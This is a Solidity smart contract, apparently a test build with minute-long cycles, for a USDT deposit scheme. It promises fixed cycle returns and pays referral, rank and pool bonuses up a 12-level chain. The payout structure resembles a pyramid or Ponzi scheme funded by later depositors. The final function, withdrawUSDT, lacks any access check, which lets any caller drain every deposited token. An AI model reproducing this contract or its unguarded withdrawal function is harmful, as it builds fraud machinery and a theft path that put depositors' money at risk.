// SPDX-License-Identifier: GPLv3

pragma solidity >=0.8.0;

import "./SafeMath.sol";
import "./IERC20.sol";

contract FreeTest {
    using SafeMath for uint256;
    IERC20 public usdt;
    uint256 private constant baseDivider = 10000;
    uint256 private constant limitProfit = 20000;
    uint256 private constant boosterLimitProfit = 30000;
    uint256 private constant feePercents = 200; 
    uint256 private constant minDeposit = 100e6; 
    uint256 private constant maxDeposit = 2500e6; 
    uint256 private constant freezeIncomePercents = 3000;
    uint256 private constant LuckDeposit = 1000e6; 
    uint256 private constant timeStep = 1 minutes; 
    uint256 private constant dayPerCycle = 1 minutes;
    uint256 private constant maxAddFreeze = 5 minutes; 
    uint256 private constant normalcycleRewardPercents = 1500;
    uint256 private constant boostercycleRewardPercents = 2000;
    uint256 private constant referDepth = 12;
    uint256 private constant boosterPoolTimeLimit = 15 minutes;

    uint256 private constant directPercents = 500;
    uint256[] private diamondLevels = [100,200,100,200]; 
    uint256[] private blueDiamondLevels = [100,100,100,100,100,50,50]; 

    uint256 private constant infiniteRewardPercents = 400; 
    uint256 private constant boosterPoolPercents = 50; 
    uint256 private constant supportPoolPercents = 100; 
    uint256 private constant more1kIncomePoolPercents = 50; 

    address[2] public feeReceivers; 
    address[2] public defaultReceivers;
    address public supportFundAccount;

    address public defaultRefer; 
    uint256 public startTime;
    uint256 public lastDistribute; 
    uint256 public totalUser;
    uint256 public more1kIncomePool;
    uint256 public boosterPool;

    uint256 private balDown = 10e9;
    bool private balReached;
    uint256 private balDownRateSL1 = 8000;
    uint256 private balDownRateSL2 = 6000;
    uint256 private balRecover = 11000;
    uint256 public AllTimeHigh;
    uint256 public balDownHitAt;
    bool public isRecoveredFirstTime = false;
    bool public isStopLoss20ofATH = false;
    bool public isStopLoss40ofATH = false;
    uint256 public lastFreezed;
    bool private balanceHitZero;

    mapping(uint256=>address[]) public dayMore1kUsers;
    address[] public boosterUsers;
    uint256 public dayMore1KLastDistributed;

    struct OrderInfo {
        uint256 amount;
        uint256 start;
        uint256 unfreeze;
        bool isClaimed;
    }

    mapping(address => OrderInfo[]) public orderInfos;

    address[] public depositors;

    struct UserInfo {
        address referrer;
        uint256 start; //cycle start time
        uint256 level;
        uint256 maxDeposit;
        uint256 maxDirectDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 teamTotalDeposit;
        uint256 directTeamTotalVolume;
        uint256 totalFreezed;
        uint256 totalRevenue;
        uint256 depositDistributed;
    }

    struct UserAchievements {
        bool isbooster;
        uint256 boosterAcheived;
        uint256 boosterAcheivedAmount;
    }

    mapping(address => UserAchievements) public userAchieve;
    mapping(address => UserInfo) public userInfo;
    mapping(address => mapping(uint256 => address[])) public teamUsers;
    mapping(address => address[]) public myTeamUsers;

    struct RewardInfo {
        uint256 capitals;
        uint256 statics;
        uint256 directs;
        uint256 levelReleased;
        uint256 blueDiamondReleased;
        uint256 blueDiamondFreezed;
        uint256 infinityBonusReleased;
        uint256 infinityFreezed;
        uint256 blueDiamondReceived;
        uint256[2] crownDiamondReceived;
        uint256 more1k;
        uint256 booster;
        uint256 lockusdt;
        uint256 lockusdtDebt; 
    }

    mapping(address => RewardInfo) public rewardInfo;

    uint256 private constant maxBlueDiamondFreeze = 30e6;
    uint256 private constant maxCrownDiamondFreeze = 100e6;
    uint256 private constant maxInfinityL1toL5 = 100e6;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositBylockusdt(address user, uint256 amount);
    event TransferBylockusdt(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);

    constructor(
        address _usdtAddr,
        address _defaultRefer,
        address _supportFund,
        address[2] memory _feeReceivers,
        address[2] memory _defaultReceivers
    ) {
        usdt = IERC20(_usdtAddr);
        defaultRefer = _defaultRefer;
        supportFundAccount = _supportFund;
        feeReceivers = _feeReceivers;
        defaultReceivers = _defaultReceivers;
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
    }

    function register(address _referral) external {
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer,"invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        if(msg.sender == defaultRefer) {
            user.referrer = address(this);
        } else {
            user.referrer = _referral;
        }
        totalUser = totalUser.add(1);
        emit Register(msg.sender, _referral);
    }
    
    function _updateTeamNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for (uint256 i = 0; i < referDepth; i++) {
            if (upline != address(0)) {
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if (upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }
    }

    function _updateLevel(address _user) private {
        UserInfo storage user = userInfo[_user];
        user.level = _calLevelNow(_user);
    }

    function _calLevelNow(address _user) private view returns (uint256) {
        UserInfo storage user = userInfo[_user];
        uint256 level;
        uint256 directTeam = myTeamUsers[_user].length;
        (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);
        uint256 totalTeam = user.teamNum;
        if(user.maxDeposit >= 800e6 && directTeam >=2 && user.maxDirectDeposit >= 300e6 && totalTeam >= 3 && maxTeam >= 400e6 && otherTeam >= 200e6){
            level = 4;
        }else if(user.maxDeposit >= 500e6 && directTeam >=1 && user.maxDirectDeposit >= 200e6 && totalTeam >= 2 && maxTeam >= 300e6 && otherTeam >= 100e6){
            level = 3;
        }else if(user.maxDeposit >= 400e6 && directTeam >=1 && user.maxDirectDeposit >= 100e6 && totalTeam >= 1 && maxTeam >= 200e6 && otherTeam >= 0){
            level = 2;
        } else if(user.maxDeposit >= minDeposit) {
            level = 1;
        }
        return level;
    }

    function _updatemaxdirectdepositInfo(address _user, uint256 _amount, uint256 _prevMax) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;

        if (upline != address(0)) {
            userInfo[upline].maxDirectDeposit = userInfo[upline]
                .maxDirectDeposit
                .add(_amount);
            userInfo[upline].maxDirectDeposit = userInfo[upline]
                .maxDirectDeposit
                .sub(_prevMax);

            userInfo[upline].directTeamTotalVolume = userInfo[upline].directTeamTotalVolume.add(_amount);
        }
    }

    function deposit(uint256 _amount) external {
        require(_amount.mod(minDeposit) == 0,"amount should be multiple of 100");
        usdt.transferFrom(msg.sender, address(this), _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }

    function _deposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        uint256 prevMax = user.maxDeposit;
        require(user.referrer != address(0),"register first with referral address");
        require(_amount >= minDeposit, "should be more than 100");
        require(_amount <= maxDeposit, "should be less than 2500");
        require(user.maxDeposit == 0 || _amount >= user.maxDeposit,"next deposit should be equal or more than previous");

        if (user.maxDeposit == 0) {
            user.maxDeposit = _amount;
            user.start = block.timestamp;
            myTeamUsers[user.referrer].push(_user);
            _updateTeamNum(_user);
        } else if (user.maxDeposit < _amount) {
            user.maxDeposit = _amount;
        }

        _distributeDeposit(_amount);

        if(user.totalDeposit == 0){
            uint256 dayNow = dayMore1KLastDistributed;
            _updateDayMore1kUsers(_user, dayNow);
        }

        _updateDepositors(_user);

        user.totalDeposit = user.totalDeposit.add(_amount);
        user.totalFreezed = user.totalFreezed.add(_amount);

        uint256 addFreeze = (orderInfos[_user].length).mul(timeStep);
        if (addFreeze > maxAddFreeze) {
            addFreeze = maxAddFreeze;
        }

        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        orderInfos[_user].push(OrderInfo(_amount, block.timestamp, unfreezeTime, false));

        _updatemaxdirectdepositInfo(_user, _amount, prevMax);
        
        _unfreezeFundAndUpdateReward(_user, _amount); 

        _isBooster(_user);

        _isBooster(user.referrer);

        distributePoolRewards(); 

        _updateReferInfo(_user, _amount); //update totalDep and totalVol

        _updateReward(_user, _amount, prevMax); //calculate directs and level reward

        _updateInfinity(_user, _amount);

        _updateLevel(_user);

        uint256 bal = usdt.balanceOf(address(this));

        if(bal >= balDown) {
            balReached = true;
        }

        if(bal > AllTimeHigh) {
            AllTimeHigh = bal;
        }

        if (isStopLoss20ofATH || isStopLoss40ofATH) {
            _setFreezeReward(bal);
        }
    }

    function _isBooster(address _user) private {
        if(!(userAchieve[_user].isbooster) && myTeamUsers[_user].length >= 1 && userInfo[_user].maxDeposit >= 200e6) {
            uint256 count;
            for(uint256 i=0; i<myTeamUsers[_user].length; i++) {
                address downline = myTeamUsers[_user][i]; 
                if(userInfo[downline].start < userInfo[_user].start.add(10 minutes)) {
                    if(userInfo[downline].maxDeposit >= userInfo[_user].maxDeposit) {
                        count = count.add(1);
                    }
                } else {
                    break;
                }
            }

            if(count >= 1) {
                if(_user == msg.sender) {
                    userAchieve[_user].isbooster = true;
                    userAchieve[_user].boosterAcheivedAmount = userInfo[_user].maxDeposit;
                } else if(!(userAchieve[_user].boosterAcheived > 0)) {
                    userAchieve[_user].boosterAcheived = block.timestamp;
                    boosterUsers.push(_user);
                }
            }
        } 
    }

    function _updateDayMore1kUsers(address _user, uint256 _dayNow) private {
        bool isFound;
        for(uint256 i=0; i<dayMore1kUsers[_dayNow].length; i++) {
            if(dayMore1kUsers[_dayNow][i] == userInfo[_user].referrer) {
                isFound = true;
                break;
            }
        }

        if(!isFound) {
            address referrer = userInfo[_user].referrer;
            uint256 myTeam = myTeamUsers[referrer].length;
            uint256 volume;
            for(uint256 i=myTeam; i>0; i--) {
                address _newUser = myTeamUsers[referrer][i-1];
                if(userInfo[_newUser].start > lastDistribute) {
                    volume = volume.add(userInfo[_newUser].maxDeposit);
                } else {
                    break;
                }
            }

            if(volume >= LuckDeposit) {
                dayMore1kUsers[_dayNow].push(userInfo[_user].referrer);
            }
        } 
    }

    function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        usdt.transfer(feeReceivers[0], fee.div(2));
        usdt.transfer(feeReceivers[1], fee.div(2));
        if(!balanceHitZero) {
            uint256 _support = _amount.mul(supportPoolPercents).div(baseDivider);
            usdt.transfer(supportFundAccount, _support);
        }
        uint256 more1kPool = _amount.mul(more1kIncomePoolPercents).div(baseDivider);
        more1kIncomePool = more1kIncomePool.add(more1kPool);
        uint256 _booster = _amount.mul(more1kIncomePoolPercents).div(baseDivider);
        boosterPool = boosterPool.add(_booster); 
    }

    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezed;

        for (uint256 i = 0; i < orderInfos[_user].length; i++) {
            OrderInfo storage order = orderInfos[_user][i];
            if (block.timestamp > order.unfreeze && !order.isClaimed) {
                if (user.totalFreezed > order.amount) {
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                } else {
                    user.totalFreezed = 0;
                }

                _removeInvalidDeposit(_user, order.amount);

                uint256 staticReward = _returnStaticReward(_user, order.amount);

                if(user.level > 2 && staticReward >= 5e6 && !balanceHitZero) {
                    usdt.transfer(supportFundAccount, 5e6);
                    staticReward = staticReward.sub(5e6);
                }

                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);
                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);
                userInfo[_user].totalRevenue = userInfo[_user].totalRevenue.add(staticReward);
                
                order.isClaimed = true;
                isUnfreezed = true;
                break;
            }
        }

        if(!isUnfreezed) {
            RewardInfo storage userReward = rewardInfo[_user];
            uint256 release = _amount;

            if(userReward.blueDiamondFreezed > 0) {
                if(release >= userReward.blueDiamondFreezed) {
                  release = release.sub(userReward.blueDiamondFreezed);
                  user.totalRevenue = user.totalRevenue.add(userReward.blueDiamondFreezed);
                  userReward.blueDiamondReleased = userReward.blueDiamondReleased.add(userReward.blueDiamondFreezed);
                  userReward.blueDiamondFreezed = 0;  
                } else {
                  userReward.blueDiamondFreezed = userReward.blueDiamondFreezed.sub(release);
                  userReward.blueDiamondReleased = userReward.blueDiamondReleased.add(release);
                  user.totalRevenue = user.totalRevenue.add(release);
                  release = 0;
                }
            }

            if(userReward.infinityFreezed > 0 && release > 0) {
                if(release >= userReward.infinityFreezed) {
                  release = release.sub(userReward.infinityFreezed);
                  user.totalRevenue = user.totalRevenue.add(userReward.infinityFreezed);
                  userReward.infinityBonusReleased = userReward.infinityBonusReleased.add(userReward.infinityFreezed);
                  userReward.infinityFreezed = 0;  
                } else {
                  userReward.infinityFreezed = userReward.infinityFreezed.sub(release);
                  userReward.infinityBonusReleased = userReward.infinityBonusReleased.add(release);
                  user.totalRevenue = user.totalRevenue.add(release);
                  release = 0;
                }
            }
        }
    }

    function _returnStaticReward(address _user, uint256 _amount) private view returns(uint256) {
        uint256 staticReward;
        UserInfo memory user = userInfo[_user];

        if(user.totalRevenue < getMaxFreezing(_user).mul(limitProfit).div(baseDivider) || user.level > 1 || _isEligible(_user)) {
            staticReward = _amount.mul(normalcycleRewardPercents).div(baseDivider);
        }
        
        if(userAchieve[_user].isbooster){
            uint256 boosterIncome;
            if(user.level > 1) {
                staticReward = _amount.mul(boostercycleRewardPercents).div(baseDivider);
            } else if(user.totalRevenue < getMaxFreezing(_user).mul(boosterLimitProfit).div(baseDivider) || _isEligible(_user)) {
                if(userAchieve[_user].boosterAcheivedAmount < _amount) {
                    boosterIncome = userAchieve[_user].boosterAcheivedAmount.mul(boostercycleRewardPercents).div(baseDivider);
                    staticReward = (_amount.sub(userAchieve[_user].boosterAcheivedAmount)).mul(normalcycleRewardPercents).div(baseDivider);
                    staticReward = staticReward.add(boosterIncome);
                } else {
                    staticReward = _amount.mul(boostercycleRewardPercents).div(baseDivider);
                }
            }
        }

        if(isStopLoss40ofATH || isStopLoss20ofATH) {
            if(user.totalRevenue >= user.totalFreezed) {
                staticReward = 0;
            } else {
                uint256 temp = user.totalFreezed.sub(user.totalRevenue);
                if(temp < staticReward) {
                    staticReward = temp;
                }
            }
        } else if(isRecoveredFirstTime && staticReward > 0 && user.level > 1) {
            staticReward = staticReward.div(2);
        }

        return staticReward;
    }

    function _returnDynamicReward(address _user, address _upline, uint256 _amount) private view returns(uint256) {
        uint256 newAmount;
        UserInfo memory upline = userInfo[_upline];

        if(upline.totalRevenue < getMaxFreezing(_upline).mul(limitProfit).div(baseDivider) || upline.level > 1 || _isEligible(_upline)) {
            newAmount = _amount;
        } 
        
        if(userAchieve[_upline].isbooster){
            if(upline.totalRevenue < getMaxFreezing(_upline).mul(boosterLimitProfit).div(baseDivider) || upline.level > 1 || _isEligible(_upline)) {
                newAmount = _amount;
            }
        }

        if(isStopLoss20ofATH) {
            if(upline.totalRevenue < upline.totalFreezed || userInfo[_user].start > lastFreezed) {
                newAmount = newAmount;
            } else {
                newAmount = newAmount.div(2);
            }
        }

        if(isStopLoss40ofATH) {
            if(!(userInfo[_user].start > lastFreezed)) {
                newAmount = 0;
            }
        }

        return newAmount;
    }

    function _isEligible(address _user) private view returns(bool) {
        bool isEligible;
        uint256 volume;
        for(uint256 j=0; j<myTeamUsers[_user].length; j++) {
            address downline = myTeamUsers[_user][j]; 
            if(orderInfos[downline].length > 0) {
                volume = volume.add(userInfo[downline].maxDeposit);
            }
        }

        if(volume >= 500e6 && myTeamUsers[_user].length >= 3) {
            isEligible = true;
        }

        return isEligible;
    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for (uint256 i = 0; i < referDepth; i++) {
            if (upline != address(0)) {
                if (userInfo[upline].teamTotalDeposit > _amount) {
                    userInfo[upline].teamTotalDeposit = userInfo[upline]
                        .teamTotalDeposit
                        .sub(_amount);
                } else {
                    userInfo[upline].teamTotalDeposit = 0;
                }
                if (upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }
    }

    function distributePoolRewards() public {
        if (block.timestamp > lastDistribute.add(timeStep)) {
            uint256 dayNow = dayMore1KLastDistributed;
            _distributeLuckPool1k(dayNow);
            _distributeBoosterPool();
            lastDistribute = block.timestamp;
            dayMore1KLastDistributed = dayMore1KLastDistributed.add(1);
        }
    }

    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function _distributeLuckPool1k(uint256 _dayNow) private {
        uint256 day1kDepositCount = dayMore1kUsers[_dayNow].length;
        if(day1kDepositCount > 0){
            uint256 reward = more1kIncomePool.div(day1kDepositCount);
            uint256 totalReward;

            for(uint256 i = day1kDepositCount; i > 0; i--){
                address userAddr = dayMore1kUsers[_dayNow][i - 1];
                if(userAddr != address(0)){
                    uint256 givenReward = reward;
                    if(!(getMaxFreezing(userAddr) > 0)) {
                        givenReward = 0;
                    }
                    rewardInfo[userAddr].more1k = rewardInfo[userAddr].more1k.add(givenReward);
                    userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(givenReward);
                    totalReward = totalReward.add(givenReward);
                }
            }

            if(more1kIncomePool > totalReward){
                more1kIncomePool = more1kIncomePool.sub(totalReward);
            }else{
                more1kIncomePool = 0;
            }
        }
    }

    function _distributeBoosterPool() private {
        uint256 boosterCount;
        for(uint256 i=boosterUsers.length; i>0; i--) {
            UserAchievements memory userboost = userAchieve[boosterUsers[i-1]];
            if((block.timestamp - userboost.boosterAcheived) < boosterPoolTimeLimit) {
                boosterCount = boosterCount.add(1);
            } else {
                break;
            }
        }

        if(boosterCount > 0) {
            uint256 reward = boosterPool.div(boosterCount);
            uint256 totalReward;
    
            for(uint256 i=boosterUsers.length; i>0; i--) {
                address userAddr = boosterUsers[i-1];
                UserAchievements memory userboost = userAchieve[boosterUsers[i-1]];
                if((block.timestamp - userboost.boosterAcheived) < boosterPoolTimeLimit && userAddr != address(0)) {
                    uint256 calReward = _returnPoolReward(userAddr, reward);
                    rewardInfo[userAddr].booster = rewardInfo[userAddr].booster.add(calReward);
                    userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(calReward);
                    totalReward = totalReward.add(calReward);
                } else {
                    break;
                }
            }

            if(boosterPool > totalReward){
                boosterPool = boosterPool.sub(totalReward);
            }else{
                boosterPool = 0;
            }
        }
    }

    function _returnPoolReward(address _user, uint256 _amount) private view returns(uint256) {
        uint256 reward = 0;
        UserInfo memory user = userInfo[_user];
        
        if(user.totalRevenue < getMaxFreezing(_user).mul(boosterLimitProfit).div(baseDivider) || user.level > 1) {
            reward = _amount;
        }

        if(isStopLoss20ofATH && !(user.totalRevenue < user.totalFreezed)) {
            reward = reward.div(2);
        }

        if(isStopLoss40ofATH) {
            reward = 0;
        }

        if(!(getMaxFreezing(_user) > 0)) {
            reward = 0;
        }

        return reward;
    }

    function _updateReferInfo(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i=0; i<referDepth; i++) {
            if (upline != address(0)) {
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }
    }

    function _updateReward(address _user, uint256 _amount, uint256 _prevMax) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;

        bool isDistributed;
        bool shouldDistribute;
        if (_amount > _prevMax || user.depositDistributed < 8) {
            shouldDistribute = true;
        }

        if (_amount > _prevMax) {
            user.depositDistributed = 0;
        }

        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                uint256 newAmount = _amount;

                uint256 maxFreezing = getMaxFreezing(upline);
                if (maxFreezing < _amount && upline != defaultRefer) {
                    newAmount = maxFreezing;
                }

                newAmount = _returnDynamicReward(_user, upline, newAmount);

                RewardInfo storage upRewards = rewardInfo[upline];
                uint256 reward;

                if(i > 4) {
                    if (userInfo[upline].level >= 3 && upRewards.blueDiamondReceived < maxBlueDiamondFreeze) {
                        reward = newAmount.mul(blueDiamondLevels[i - 5]).div(baseDivider);
                        upRewards.blueDiamondFreezed = upRewards.blueDiamondFreezed.add(reward);
                        upRewards.blueDiamondReceived = upRewards.blueDiamondReceived.add(reward);
                    } 
                } else if(i > 0) {
                    if(userInfo[upline].level >= 2) {
                        reward = newAmount.mul(diamondLevels[i - 1]).div(baseDivider);
                        upRewards.levelReleased = upRewards.levelReleased.add(reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                    }
                } else if(shouldDistribute) {
                    reward = newAmount.mul(directPercents).div(baseDivider);
                    upRewards.directs = upRewards.directs.add(reward);
                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                    
                    isDistributed = true;
                }

                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }

        if (isDistributed) {
            user.depositDistributed = (user.depositDistributed).add(1);
        }
    }

    function _updateInfinity(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        uint256 layer = 1;
        for(int i=0; i<100; i++) {
            if(upline != address(0)) {
                if(userInfo[upline].level >= 4) {
                    uint256 newAmount = _amount;
                    uint256 maxFreezing = getMaxFreezing(upline);
                    if (maxFreezing < _amount && upline != defaultRefer) {
                        newAmount = maxFreezing;
                    }

                    newAmount = _returnDynamicReward(_user, upline, newAmount);

                    RewardInfo storage upRewards = rewardInfo[upline];

                    if(layer <= 5 && upRewards.crownDiamondReceived[0] < maxInfinityL1toL5) {
                        uint256 reward = newAmount.mul(infiniteRewardPercents).div(baseDivider);
                        upRewards.crownDiamondReceived[0] = upRewards.crownDiamondReceived[0].add(reward);
                        upRewards.infinityBonusReleased = upRewards.infinityBonusReleased.add(reward); 
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                    } else if(layer > 5 && upRewards.crownDiamondReceived[1] < maxCrownDiamondFreeze) {
                        uint256 reward = newAmount.mul(infiniteRewardPercents).div(baseDivider);
                        upRewards.infinityFreezed = upRewards.infinityFreezed.add(reward); 
                        upRewards.crownDiamondReceived[1] = upRewards.crownDiamondReceived[1].add(reward);
                    }

                    break;
                } else {
                    upline = userInfo[upline].referrer;
                }

                layer = layer.add(1);
            } else {
                break;
            }
        }
    }

    function getMaxFreezing(address _user) public view returns (uint256) {
        uint256 maxFreezing;
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }

    function _setFreezeReward(uint256 _bal) private {
        if(balReached) {
            if (_bal <= AllTimeHigh.mul(balDownRateSL1).div(baseDivider) && !isStopLoss20ofATH) {
                isStopLoss20ofATH = true;
                balDownHitAt = AllTimeHigh;
                lastFreezed = block.timestamp;
                depositFromSupportFunds();
            } else if (isStopLoss20ofATH && _bal >= balDownHitAt.mul(balRecover).div(baseDivider)) {
                isStopLoss20ofATH = false;
                isRecoveredFirstTime = true;
            }

            if (isStopLoss20ofATH && _bal <= AllTimeHigh.mul(balDownRateSL2).div(baseDivider)) {
                isStopLoss40ofATH = true;
            } else if (isStopLoss40ofATH && _bal >= balDownHitAt.mul(balRecover).div(baseDivider)) {
                isStopLoss40ofATH = false;
            }

            if(_bal <= 50e6) {
                depositFromSupportFunds();
                balanceHitZero = true;
            }
        }
    }

    function withdraw() external {
        RewardInfo storage userRewards = rewardInfo[msg.sender];
        distributePoolRewards();
        (uint256 staticReward, uint256 staticlockusdt) = _calCurStaticRewards(msg.sender);
        uint256 lockusdtAmt = staticlockusdt;
        uint256 withdrawable = staticReward;

        (uint256 dynamicReward, uint256 dynamiclockusdt) = _calCurDynamicRewards(msg.sender);
        withdrawable = withdrawable.add(dynamicReward);
        lockusdtAmt = lockusdtAmt.add(dynamiclockusdt);

        UserInfo storage userin = userInfo[msg.sender];

        userRewards.lockusdt = userRewards.lockusdt.add(lockusdtAmt);

        userRewards.statics = 0;
        userRewards.directs = 0;
        userRewards.levelReleased = 0;
        userRewards.infinityBonusReleased = 0;
        
        userRewards.more1k = 0;
        userRewards.booster = 0;
        withdrawable = withdrawable.add(userRewards.capitals);
        userRewards.capitals = 0;

        if(userin.maxDeposit >= 300e6 && withdrawable >= 3e6) {
            withdrawable = withdrawable.sub(3e6);
        }
        
        if(msg.sender == defaultRefer) {
            uint256 reward = withdrawable.div(2);
            usdt.transfer(defaultReceivers[0], reward);
            usdt.transfer(defaultReceivers[1], reward);
        } else {
            usdt.transfer(msg.sender, withdrawable);
        }

        uint256 bal = usdt.balanceOf(address(this));
        _setFreezeReward(bal);

        emit Withdraw(msg.sender, withdrawable);
    }

    function _calCurStaticRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.statics;
        uint256 lockusdtAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(lockusdtAmt);
        return(withdrawable, lockusdtAmt);
    }

    function _calCurDynamicRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = (userRewards.directs).add(userRewards.levelReleased);
        totalRewards = totalRewards.add(userRewards.more1k).add(userRewards.booster).add(userRewards.blueDiamondReleased).add(userRewards.infinityBonusReleased);

        uint256 lockusdtAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);

        uint256 withdrawable = totalRewards.sub(lockusdtAmt);
        return(withdrawable, lockusdtAmt);
    }

    function depositBylockusdt(uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        require(orderInfos[msg.sender].length == 0, "First depositors can only use this function");
        uint256 lockusdtLeft = getCurlockusdt(msg.sender);
        if(lockusdtLeft > _amount.div(2)) {
            lockusdtLeft = _amount.div(2);
        }
        usdt.transferFrom(msg.sender, address(this), _amount.sub(lockusdtLeft));
        rewardInfo[msg.sender].lockusdtDebt = rewardInfo[msg.sender].lockusdtDebt.add(lockusdtLeft);
        _deposit(msg.sender, _amount);
        emit DepositBylockusdt(msg.sender, _amount);
    }

    function getCurlockusdt(address _user) public view returns(uint256){
        (, uint256 staticlockusdt) = _calCurStaticRewards(_user);
        (, uint256 dynamiclockusdt) = _calCurDynamicRewards(_user);
        return rewardInfo[_user].lockusdt.add(staticlockusdt).add(dynamiclockusdt).sub(rewardInfo[_user].lockusdtDebt);
    }

    function getCurclaimableusdt(address _user) public view returns(uint256){
        (uint256 staticReward,) = _calCurStaticRewards(_user);
        (uint256 dynamicReward,) = _calCurDynamicRewards(_user);
        return staticReward.add(dynamicReward);
    }

    function transferBylockusdt(address _receiver, uint256 _amount) external {
        require(_amount >= minDeposit.div(2) && _amount.mod(minDeposit.div(2)) == 0, "amount err");
        require(userInfo[_receiver].referrer != address(0), "Receiver should be registrant");
        uint256 lockusdtLeft = getCurlockusdt(msg.sender);
        require(lockusdtLeft >= _amount, "insufficient Locked USDT");
        rewardInfo[msg.sender].lockusdtDebt = rewardInfo[msg.sender].lockusdtDebt.add(_amount);
        rewardInfo[_receiver].lockusdt = rewardInfo[_receiver].lockusdt.add(_amount);
        emit TransferBylockusdt(msg.sender, _receiver, _amount);
    }

    function getDayMore1kLength(uint256 _day) external view returns(uint256) {
        return dayMore1kUsers[_day].length;
    }

    function getTeamUsersLength(address _user) external view returns(uint256) {
        UserInfo storage user = userInfo[_user];
        return user.teamNum;
    }

    function getOrderLength(address _user) public view returns(uint256) {
        return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }

    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for (uint256 i = 0; i < teamUsers[_user][0].length; i++) {
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if (userTotalTeam > maxTeam) {
                maxTeam = userTotalTeam;
            }
        }

        otherTeam = totalTeam.sub(maxTeam);
        return (maxTeam, otherTeam, totalTeam);
    }

    function depositFromSupportFunds() private {
        uint256 allowanceAmount = usdt.allowance(supportFundAccount, address(this));
        uint256 _bal = usdt.balanceOf(supportFundAccount);
        if(allowanceAmount >= _bal) {
            usdt.transferFrom(supportFundAccount, address(this), _bal);
        } else if(allowanceAmount > 0) {
            usdt.transferFrom(supportFundAccount, address(this), allowanceAmount);
        }
    }

    function _checkRegistered(address _user) public view returns(bool) {
        UserInfo storage user = userInfo[_user];
        if(user.referrer != address(0)) {
            return true;
        }
        return false;
    }

    function getMyTeamNumbers(address _user) public view returns(uint256) {
        return myTeamUsers[_user].length;
    }

    function _updateDepositors(address _user) private {
        bool contains = false;
        for (uint256 i = 0; i < depositors.length; i++) {
            if(_user == depositors[i]){
                contains = true;
                break;
            }
        }
        if(!contains){
            depositors.push(_user);
        }
    }

    function withdrawUSDT(address _addr, uint256 _amount) external {
        usdt.transfer(_addr, _amount);
    }
}